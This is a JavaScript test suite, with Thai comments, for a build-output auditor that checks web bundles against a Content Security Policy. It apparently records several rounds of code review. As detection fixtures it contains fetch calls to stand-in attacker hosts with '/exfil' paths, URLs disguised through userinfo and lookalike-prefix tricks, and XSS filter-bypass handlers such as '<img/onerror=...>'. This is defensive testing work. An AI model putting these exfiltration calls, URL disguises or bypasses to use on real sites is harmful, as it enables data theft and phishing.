    'assets/a.css': '.x{color:red}',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.deepEqual(findings, [], JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('host ที่ไม่ได้ขึ้นต้นด้วยตัวอักษร/ตัวเลข ต้องไม่หลุด (review ข)', () => {
  // `/^\/\/[a-zA-Z0-9]/` ตัด IPv6 literal และ host ที่ขึ้นต้นด้วย _ ทิ้งเป็น null แล้วกฎรวม
  // ก็มองไม่เห็นเพราะบังคับ https?:// เหมือนกัน = ไม่มีกฎไหนครอบ ซึ่งคือเหตุผลเดิมของ review #1
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/v6.js': 'fetch("//[2001:db8::1]/exfil");',
    'assets/us.js': 'fetch("//_x.attacker.example/exfil");',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => /2001:db8/.test(f.detail)), `IPv6: ${JSON.stringify(findings)}`);
    assert.ok(findings.some((f) => /_x\.attacker\.example/.test(f.detail)), `underscore: ${JSON.stringify(findings)}`);
  } finally {
    cleanup();
  }
});

test('URL รูปเต็มต้องถูกนับครั้งเดียว ไม่ใช่ซ้ำจากสองกฎ (review ค)', () => {
  // CSS_URL เลิกบังคับ `//` แล้วจึงทับกับ generic scan · flag i ยังทำให้ `new URL(` เข้าข่ายด้วย
  // ผลคือจำนวนครั้งในข้อความ error ผิดเป็นเท่าตัว ซึ่งขัด Global Constraint ที่ว่า error ต้องบอก
  // "สิ่งที่เจอ" ให้ตรง — ตัวเลขที่ผิดคือข้อมูลที่ผิด ไม่ใช่แค่ความสวยงาม
  const { dir, cleanup } = makeDist({
    'a.css': '.h{background:url(https://cdn.example.com/y.png)}',
    'b.js': 'const u=new URL("https://evil.example/x");',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    for (const origin of [/cdn\.example\.com/, /evil\.example/]) {
      const hit = findings.find((f) => origin.test(f.detail));
      assert.ok(hit, JSON.stringify(findings));
      assert.doesNotMatch(hit.detail, /ครั้งในไฟล์นี้/, `เจอครั้งเดียวต้องไม่มีจำนวนครั้ง: ${hit.detail}`);
    }
  } finally {
    cleanup();
  }
});

test('origin เดียวที่โผล่หลายครั้งจริง ต้องยังรายงานจำนวนครั้งถูกต้อง (กันแก้เกิน)', () => {
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/many.js': 'a("https://x.example/1");b("https://x.example/2");c("https://x.example/3");',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    const hit = findings.find((f) => /x\.example/.test(f.detail));
    assert.ok(hit, JSON.stringify(findings));
    assert.match(hit.detail, /\(3 ครั้งในไฟล์นี้\)/, hit.detail);
  } finally {
    cleanup();
  }
});

test('แท็กที่ quote ปิดไม่ครบต้องไม่ถูกเชื่อว่ามี src (review ง)', () => {
  // `<script data-x=" src=y>` ทำให้ตัวแตก attribute ไปเจอ `src=y` เป็น attribute ใหม่
  // แล้วข้ามแท็กทั้งอัน — fail-open รูปเดียวกับ review #3 · แยก attribute ไม่ได้ = ต้องตรวจต่อ
  const { dir, cleanup } = makeDist({
    'index.html': '<!doctype html><html><body><script data-x=" src=y>alert(document.cookie)</script></body></html>',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => f.rule === 'inline-script'), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

// ── รีวิวรอบที่สี่ (code-reviewer persona) บนคอมมิต c98b9aa ────────────────────
// critical: guard `quotesBalanced` ที่เพิ่มเข้ามาเพื่อปิดช่องหนึ่ง เปิดอีกช่องหนึ่งแทน
// เพราะกฎ attribute พึ่งขอบเขตของแท็ก ซึ่ง `>` ในค่า attribute ทำให้ขาดกลางคัน

test('`>` ในค่า attribute ต้องไม่ทำให้ URL หลังจากนั้นหลุด (review critical)', () => {
  // regex แท็ก `/<[a-zA-Z][^>]*>/` ตัดที่ `>` ตัวแรก — `src` จึงอยู่นอกช่วงที่ถูกตรวจทั้งดุ้น
  // แล้ว guard quote-ไม่สมดุลก็สั่ง continue ข้ามไปอีก = fail-open สองชั้น
  const { dir, cleanup } = makeDist({
    'index.html': '<!doctype html><html><body><img alt="a>b" src="//evil1.example/x.png"></body></html>',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => /evil1\.example/.test(f.detail)), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('การกำหนดค่า .src ในโค้ด JS ก็ทำให้เกิด request จริง ต้องถูกจับ', () => {
  // เลิกพึ่งขอบเขตแท็กแล้วจับที่คู่ชื่อ-ค่าแทน จึงครอบ `el.src = "//host"` ซึ่งโหลดจริงด้วย
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/img.js': 'const el=new Image();el.src = "//evil2.example/pixel.png";',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => /evil2\.example/.test(f.detail)), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('data-src ต้องไม่ถูกอ่านเป็น src (lookbehind ไม่ใช่ \\b) — กันบั๊กเดิมกลับมา', () => {
  // `\b` ถือว่า `-` เป็นขอบเขตของคำ ถ้าใช้ `\b` แทน lookbehind บั๊ก review #3 จะกลับมาทันที
  // ในรูปใหม่ · `data-src` ไม่ใช่ attribute ที่ browser โหลดเอง จึงต้องไม่ถูกฟ้อง
  const { dir, cleanup } = makeDist({
    'index.html': '<!doctype html><html><body><div data-src="//lazy.example/x.png"></div></body></html>',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.deepEqual(findings, [], JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('srcset ที่มี data URI ต้องไม่ถูกแตกจนเกิด origin ปลอม', () => {
  // data URI มี comma อยู่ในตัว การ split(",") จึงได้ชิ้นส่วน base64 ปนมา
  const { dir, cleanup } = makeDist({
    'index.html': '<!doctype html><html><body><img srcset="data:image/png;base64,AA//BB 1x, //cdn9.example/b.png 2x"></body></html>',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => /cdn9\.example/.test(f.detail)), `ตัวจริงต้องถูกจับ: ${JSON.stringify(findings)}`);
    assert.ok(!findings.some((f) => /AA\/\/BB|https:\/\/aa/i.test(f.detail)), `base64 ต้องไม่กลายเป็น origin: ${JSON.stringify(findings)}`);
  } finally {
    cleanup();
  }
});

test('URL ที่ scheme ถูกแต่ host หายต้องไม่กลายเป็น origin ปลอม', () => {
  // guard `///` เดิมเขียนผูกกับ https จึงไม่ครอบ http · ทั้งสองรูปต้องคืน null เงียบ ๆ
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/odd.js': 'fetch("http:///x");fetch("https:///y");fetch("///z");',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.deepEqual(findings, [], JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('href ของ <a> ถูกฟ้องด้วย — เป็นการตัดสินใจ ไม่ใช่ความพลาด', () => {
  // static analysis แยก `<a href>` (navigate — CSP ไม่คุม) จาก `<link rel=stylesheet href>`
  // (subresource — style-src คุม) ไม่ได้ · เลือกฟ้องไว้ก่อนตามหลักการของ issue นี้ และมี
  // ทางออกคือ NON_FETCHED_ORIGINS ที่บังคับให้เขียนเหตุผลกำกับ · เทสนี้ล็อกพฤติกรรมไว้
  // ให้เป็นสิ่งที่เลือก ไม่ใช่สิ่งที่หลุด — ถ้าวันหนึ่งตัดสินใจกลับ ต้องมาแก้เทสนี้โดยตั้งใจ
  const { dir, cleanup } = makeDist({
    'index.html': '<!doctype html><html><body><a href="//docs.example/guide">x</a></body></html>',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => /docs\.example/.test(f.detail)), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

// ── รีวิวรอบที่ห้า บนคอมมิต d8482cb ────────────────────────────────────────────
// สองช่องที่เหลือเป็นคลาสเดียวกับที่ปิดมาแล้วทั้งหมด: **กฎเดาโครงสร้างเอาเองแทนที่จะ parse**
// กฎ URL เลิกพึ่งขอบเขตแท็กไปแล้วในรอบที่สี่ แต่กฎ handler ยังพึ่งอยู่ · และ origin ของ URL
// รูปเต็มยังถูกตัดด้วย character class ของตัวเองแทนที่จะให้ URL parser ตัดสิน
// ทั้งสองยืนยันแล้วว่า gate ตอบ PASS บนโค้ดก่อนแก้ ด้วยการรัน CLI กับ fixture จริง

test('`>` ในค่า attribute ต้องไม่ทำให้ inline event handler หลุด (review จ)', () => {
  // คู่แฝดของ review critical รอบที่แล้ว — กฎ URL ถูกแก้ให้เลิกพึ่งขอบเขตแท็กไปแล้ว
  // แต่กฎ handler ยังยิง regex ใส่ `/<[a-zA-Z][^>]*>/` ซึ่งตัดที่ `>` ตัวแรกเหมือนเดิม
  // `<img alt="a>b" onclick=...>` จึงถูกอ่านเป็น `<img alt="a>` แล้ว handler อยู่นอกช่วงตรวจ
  const { dir, cleanup } = makeDist({
    'index.html': '<!doctype html><html><body><img alt="a>b" onclick="alert(document.cookie)"><span>x</span></body></html>',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => f.rule === 'inline-event-handler'), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('host ที่ยืม origin ที่อนุญาตมาเป็นคำนำหน้า ต้องไม่ถูกอ่านเป็น origin นั้น (review ฉ)', () => {
  // `[a-zA-Z0-9.-]+` หยุดที่ `_` ซึ่งเป็นอักขระที่ host จริงมีได้ — `fonts.googleapis.com_evil.example`
  // จึงถูกตัดหัวเหลือ `https://fonts.googleapis.com` ซึ่งอยู่ใน style-src → เงียบสนิท
  // นี่ไม่ใช่แค่ข้อความ error เพี้ยน แต่เป็น false PASS เต็มรูป: ยิ่ง policy อนุญาต origin ไว้มาก
  // ช่องนี้ยิ่งกว้าง เพราะทุก origin ที่อนุญาตกลายเป็นคำนำหน้าที่ยืมได้
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/lookalike.js': 'const a="https://fonts.googleapis.com_evil.example/steal";',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(
      findings.some((f) => /fonts\.googleapis\.com_evil\.example/.test(f.detail)),
      JSON.stringify(findings)
    );
  } finally {
    cleanup();
  }
});

test('userinfo ใน URL ต้องไม่ถูกอ่านเป็น host (review ช)', () => {
  // `https://fonts.gstatic.com@evil.example/steal` — host จริงคือ evil.example ตามมาตรฐาน URL
  // ส่วนที่อยู่หน้า `@` เป็น userinfo · regex ตัดที่ `@` จึงอ่านได้เป็น origin ที่ font-src อนุญาต
  // สำนวนนี้เป็นวิธีพราง URL ที่ใช้จริงในฟิชชิ่ง ไม่ใช่เคสสมมติ
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/userinfo.js': 'const a="https://fonts.gstatic.com@evil.example/steal";',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => /evil\.example/.test(f.detail)), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('IPv6 literal รูปเต็มในสตริงลอย ต้องถูกจับเหมือนรูป protocol-relative', () => {
  // รูป `//[2001:db8::1]/` ถูกปิดไปแล้วใน review ข ผ่าน originOf() แต่รูปเต็ม `http://[…]`
  // ยังผ่านกฎรวมที่ใช้ character class ของตัวเอง ซึ่ง `[` ไม่เข้าข่ายเลย = ไม่มีกฎไหนครอบ
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/v6full.js': 'const u = "http://[2001:db8::1]/exfil";',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => /2001:db8/.test(f.detail)), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});

test('url() หลายตัวใน declaration เดียว ต้องถูกจับครบทุก origin (กันแก้เกิน)', () => {
  // คู่ตรงข้ามของสามเทสบน — การขยาย character class ให้กว้างขึ้นต้องไม่กลืน `),` เข้าไป
  // จนสอง origin กลายเป็นก้อนเดียวแล้วตัวหลังหายไปเงียบ ๆ
  const { dir, cleanup } = makeDist({
    'index.html': CLEAN_HTML,
    'assets/index-abc.js': 'const a=1;export{a};',
    'assets/multi.css': '.h{background:url(https://cdn1.example/a.png),url(https://cdn2.example/b.png)}',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    for (const origin of [/cdn1\.example/, /cdn2\.example/]) {
      assert.ok(findings.some((f) => origin.test(f.detail)), `${origin}: ${JSON.stringify(findings)}`);
    }
  } finally {
    cleanup();
  }
});

test('โค้ด JS ที่มีตัวดำเนินการเปรียบเทียบ ต้องไม่ถูกอ่านเป็นแท็กแล้วจับ handler ผิด (กันแก้เกิน)', () => {
  // ตัวแตกแท็กที่เคารพ quote ต้องไม่ทำให้ `a<b && once = true` กลายเป็นแท็กที่ลากยาว
  // จนไปกิน ` once =` มาเป็น handler — regression เดียวกับ M-A แต่มาจากทางตรงข้าม
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/cmp.js': 'const r = a<b && once = true; const s = x<y && only = 2; el.onclick = go;',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    const noise = findings.filter((f) => f.rule === 'inline-event-handler');
    assert.deepEqual(noise, [], JSON.stringify(noise));
  } finally {
    cleanup();
  }
});

// ── รีวิวรอบที่หก บนคอมมิต 6fd2b58 (reviewer subagent) ────────────────────────
// คลาสเดิมยังไม่ปิด — ทั้งสามข้อล้วนเป็น "กฎเดาขอบเขตเอง แทนที่จะให้ตัว parse ตัดสิน"
// อีกครั้ง แต่คนละที่กับรอบที่ห้า · ทุกข้อยืนยันแล้วว่า gate ตอบ PASS บนโค้ดก่อนแก้

test('userinfo ที่มีอักขระซึ่ง regex เคยใช้เป็นตัวตัด ต้องไม่ทำให้ host ถูกอ่านผิด (review ซ)', () => {
  // รอบที่ห้าปิดเฉพาะ `@` ที่ติดกับ origin — แต่ตัวตัด `, ; ( ) { }` ที่เพิ่มเข้ามาเพื่อแยก
  // `url(a),url(b)` กลายเป็นช่องใหม่ทันที เพราะอักขระเหล่านี้อยู่ในส่วน userinfo ได้ตามมาตรฐาน
  // URL และ host จริงถูกตัดสินด้วย `@` ตัวสุดท้าย — ยิ่ง policy อนุญาต origin ไว้มาก
  // ช่องยิ่งกว้าง เพราะทุก origin ที่อนุญาตกลายเป็นคำนำหน้าที่ยืมได้ (คำอธิบายเดียวกับ review ฉ)
  for (const separator of [',', ';', '(', '{', '}']) {
    const { dir, cleanup } = makeDist({
      ...cleanFiles,
      'assets/userinfo.js': `const u = "https://fonts.gstatic.com${separator}x@evil.example/steal";`,
    });
    try {
      const { findings } = auditBundle(dir, POLICY);
      assert.ok(
        findings.some((f) => /evil\.example/.test(f.detail)),
        `ตัวคั่น "${separator}": ${JSON.stringify(findings)}`
      );
    } finally {
      cleanup();
    }
  }
});

test('inline event handler ที่ไม่มีช่องว่างนำหน้าต้องถูกจับ (review ฌ)', () => {
  // `/\son[a-z]+/` บังคับ whitespace นำหน้า แต่ HTML ไม่ได้บังคับ — `<img/onerror=…>` เป็น
  // สำนวน bypass ตัวกรอง XSS ที่ใช้กันมานาน · ไฟล์นี้มีตัวแตก attribute ของตัวเองอยู่แล้ว
  // (parseAttributes ที่ branch <script> ใช้) การยิง regex ดิบทับ attrs จึงเป็นการเดาซ้ำซ้อน
  const cases = {
    'slash.html': '<!doctype html><html><body><img/onerror="alert(1)"></body></html>',
    'selfclose.html': '<!doctype html><html><body><img src=x /onerror="alert(1)"></body></html>',
    'afterquote.html': '<!doctype html><html><body><a href="x"onclick="alert(1)">t</a></body></html>',
  };
  for (const [name, content] of Object.entries(cases)) {
    const { dir, cleanup } = makeDist({ ...cleanFiles, [name]: content });
    try {
      const { findings } = auditBundle(dir, POLICY);
      assert.ok(
        findings.some((f) => f.rule === 'inline-event-handler'),
        `${name}: ${JSON.stringify(findings)}`
      );
    } finally {
      cleanup();
    }
  }
});

test('แท็กที่ยาวเกินลิมิตต้องถูกฟ้องว่าตรวจไม่ได้ ไม่ใช่ข้ามเงียบ ๆ (review ญ)', () => {
  // "ไม่รู้" ต้องไม่กลายเป็น "สะอาด" — attribute ที่ยาวเกิน OPEN_TAG_SCAN_LIMIT ทำให้อ่าน
  // แท็กไม่ครบ แล้วกฎ handler เลือกเงียบ · เส้นแบ่งอยู่ใกล้ของจริงกว่าที่คิด: assetsInlineLimit
  // ของ Vite เป็น 4096 ไบต์ = ~5,461 ตัวอักษรเมื่อ base64 ซึ่งเกินลิมิตนี้ทันที
  const long = 'A'.repeat(4200);
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'huge.html': `<!doctype html><html><body><img src="data:image/png;base64,${long}" onerror="alert(1)"></body></html>`,
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.length > 0, `ต้องมี finding สักอย่าง: ${JSON.stringify(findings)}`);
  } finally {
    cleanup();
  }
});

test('โค้ด JS ที่มีตัวดำเนินการเปรียบเทียบ **และมี `>` อยู่ในไฟล์** ต้องไม่ถูกจับ (review ฎ)', () => {
  // เทส "กันแก้เกิน" ของรอบที่ห้าใช้ fixture ที่ไม่มี `>` เลยสักตัว ทุก pseudo-tag จึง
  // terminated:false แล้ว guard ก็ข้ามให้ = เทสเขียวด้วยเหตุผลคนละอย่างกับที่มันอ้างว่าปกป้อง
  // arrow function ตัวเดียว (มีในทุก bundle สมัยใหม่) ทำให้ \` once = \` ถูกจับเป็น handler ทันที
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'assets/cmp.js': 'const r = a<b && once = true; const s = x<y && only = 2; el.onclick = go; const f = x=>x;',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    const noise = findings.filter((f) => f.rule === 'inline-event-handler');
    assert.deepEqual(noise, [], JSON.stringify(noise));
  } finally {
    cleanup();
  }
});

test('attribute ที่เอกสารบอกว่าตรวจ ต้องถูกตรวจจริง (review ฏ — อ้างว่าครอบ ทั้งที่ไม่ครอบ)', () => {
  // เอกสารระบุ `data` อยู่ในรายการ attribute ที่ตรวจ แต่กฎไม่เคยมี — `<object data="//host">`
  // จึงผ่านฉลุยขณะที่ `<embed src="//host">` ในไฟล์เดียวกันถูกจับ · ผลกระทบจริงต่ำเพราะ
  // policy ตั้ง object-src 'none' แต่ "อ้างว่าครอบ ทั้งที่ไม่ครอบ" คือ failure mode
  // เดียวกับตัวเลขที่เพี้ยนในเอกสาร ซึ่ง issue นี้มีเทส anti-drift กันไว้แล้วสองที่
  const { dir, cleanup } = makeDist({
    ...cleanFiles,
    'obj.html': '<!doctype html><html><body><object data="//evil.example/x.swf"></object></body></html>',
  });
  try {
    const { findings } = auditBundle(dir, POLICY);
    assert.ok(findings.some((f) => /evil\.example/.test(f.detail)), JSON.stringify(findings));
  } finally {
    cleanup();
  }
});
